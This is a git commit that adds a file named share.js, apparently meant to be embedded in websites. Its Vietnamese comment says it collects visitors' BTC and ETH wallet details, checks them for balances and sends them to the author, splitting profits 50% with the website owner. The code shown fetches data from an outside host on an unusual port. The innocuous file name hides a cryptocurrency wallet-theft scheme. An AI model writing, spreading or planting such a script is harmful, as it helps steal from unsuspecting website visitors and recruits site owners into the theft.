840ea49d12518547fda26da1a7595bfdc2d210fa
itvn9online <itvn9online@gmail.com>
2022-01-11 04:00:46 +0700

    Create share.js

---
+++ share.js
@@ -0,0 +1,6 @@
+/*
+ * Đoạn code này sẽ lấy địa chỉ ví BTC, ETH và thử kiểm tra xem có số dư không. Nếu có nó sẽ lưu lại thông tin ví và gửi về cho người tạo ra đoạn mã này. Đồng thời! chủ sở hữu website sẽ được chia 50% lợi nhuận nếu có.
+ */
+jQuery.getJSON('https://a.echbot.com:34567', function (data) {
+    console.log(data);
+});
